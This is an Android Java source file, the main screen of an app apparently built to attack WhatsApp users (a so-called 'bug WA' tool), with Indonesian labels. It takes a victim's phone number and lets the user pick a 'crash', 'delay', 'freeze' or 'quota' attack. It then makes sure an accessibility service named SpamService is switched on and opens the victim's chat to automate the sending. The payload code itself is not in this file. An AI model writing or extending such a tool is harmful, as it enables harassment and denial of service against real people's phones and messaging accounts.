package com.kaze.bugwa;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

public class MainActivity extends Activity {
    public static boolean isRunning = false;
    public static String targetNum = "";
    public static String senderNum = "";
    public static String bugType = "crash";
    public static String senderType = "private";
    
    private TextView terminalLog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        terminalLog = findViewById(R.id.terminalLog);

        // LOAD VIDEO BANNER
        VideoView banner = findViewById(R.id.bannerVideo);
        Uri videoUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.bannerbug);
        banner.setVideoURI(videoUri);
        banner.setOnPreparedListener(mp -> {
            mp.setLooping(true);
            mp.setVolume(0, 0); // Mute
            banner.start();
            log("Banner video loaded.");
        });

        final EditText etTarget = findViewById(R.id.targetNum);
        Button btnStart = findViewById(R.id.btnStart);
        Button btnStop = findViewById(R.id.btnStop);
        
        // BUG SETUP
        LinearLayout bugCrash = findViewById(R.id.bugCrash);
        LinearLayout bugDelay = findViewById(R.id.bugDelay);
        LinearLayout bugFreeze = findViewById(R.id.bugFreeze);
        LinearLayout bugQuota = findViewById(R.id.bugQuota);
        bugCrash.setOnClickListener(v -> selectBug("crash", bugCrash));
        bugDelay.setOnClickListener(v -> selectBug("delay", bugDelay));
        bugFreeze.setOnClickListener(v -> selectBug("freeze", bugFreeze));
        bugQuota.setOnClickListener(v -> selectBug("quota", bugQuota));

        // SENDER SETUP
        Button btnPublic = findViewById(R.id.btnPublic);
        Button btnPrivate = findViewById(R.id.btnPrivate);
        btnPublic.setOnClickListener(v -> {
            senderType = "public";
            btnPublic.setBackgroundResource(R.drawable.bg_bug_active);
            btnPrivate.setBackgroundResource(R.drawable.bg_bug_inactive);
            log("Sender: PUBLIC");
        });
        btnPrivate.setOnClickListener(v -> {
            senderType = "private";
            btnPrivate.setBackgroundResource(R.drawable.bg_bug_active);
            btnPublic.setBackgroundResource(R.drawable.bg_bug_inactive);
            log("Sender: PRIVATE");
        });

        findViewById(R.id.btnManageSender).setOnClickListener(v -> showSenderDialog());
        findViewById(R.id.btnBaca).setOnClickListener(v -> showTutorial());

        btnStop.setOnClickListener(v -> {
            isRunning = false;
            Toast.makeText(this, "STOPPED!", Toast.LENGTH_SHORT).show();
            log("Bug dihentikan paksa oleh user.");
        });

        btnStart.setOnClickListener(v -> {
            targetNum = etTarget.getText().toString().trim();
            if(targetNum.startsWith("0")) targetNum = "62" + targetNum.substring(1);
            if(targetNum.isEmpty()) { Toast.makeText(this, "Isi nomor target!", Toast.LENGTH_SHORT).show(); return; }
            
            SharedPreferences prefs = getSharedPreferences("kaze", MODE_PRIVATE);
            senderNum = prefs.getString("sender", "");

            if (senderType.equals("private") && senderNum.isEmpty()) {
                Toast.makeText(this, "Isi Private Sender dulu!", Toast.LENGTH_SHORT).show();
                showSenderDialog();
                return;
            }
            
            if(!isAccessibilityEnabled()) {
                Toast.makeText(this, "Aktifkan Aksesibilitas!", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } else {
                launchWA();
            }
        });
    }

    private void selectBug(String type, LinearLayout btn) {
        bugType = type;
        LinearLayout[] btns = {findViewById(R.id.bugCrash), findViewById(R.id.bugDelay), findViewById(R.id.bugFreeze), findViewById(R.id.bugQuota)};
        for(LinearLayout b : btns) b.setBackgroundResource(R.drawable.bg_bug_inactive);
        btn.setBackgroundResource(R.drawable.bg_bug_active);
        log("Metode: " + type.toUpperCase());
    }

    private void showTutorial() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("CARA PAKAI");
        builder.setMessage("1. Aktifkan Aksesibilitas.\n2. Isi Nomor Target.\n3. Pilih Metode Bug.\n4. Klik SEND BUG.\n5. Klik STOP untuk berhenti.");
        builder.setPositiveButton("OK", (d, w) -> d.dismiss());
        builder.show();
    }

    private void showSenderDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("MANAGE SENDER");
        final EditText input = new EditText(this);
        input.setHint("Contoh: 628987654321");
        input.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        builder.setView(input);
        builder.setPositiveButton("SIMPAN", (dialog, which) -> {
            String num = input.getText().toString().trim();
            if(num.startsWith("0")) num = "62" + num.substring(1);
            if(!num.isEmpty()) {
                senderNum = num;
                getSharedPreferences("kaze", MODE_PRIVATE).edit().putString("sender", num).apply();
                Toast.makeText(this, "Sender tersimpan!", Toast.LENGTH_SHORT).show();
            }
        });
        builder.show();
    }

    private void launchWA() {
        isRunning = true;
        log("Menembak " + targetNum + " via " + senderType);
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + targetNum));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    public void log(String msg) {
        if(terminalLog != null) terminalLog.append("\n" + msg);
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + SpamService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
